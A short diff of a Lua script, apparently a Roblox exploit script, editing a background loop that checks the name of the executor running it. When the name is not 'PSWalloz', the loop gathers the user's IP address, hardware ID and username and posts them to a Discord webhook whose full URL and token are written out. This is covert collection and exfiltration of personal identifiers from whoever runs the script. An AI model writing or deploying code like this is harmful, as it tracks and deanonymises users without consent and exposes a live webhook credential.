@@ -389,7 +389,7 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..discordip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
+            local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..getip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
             local kaka = {
                 Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                 Body = HttpService:JSONEncode({
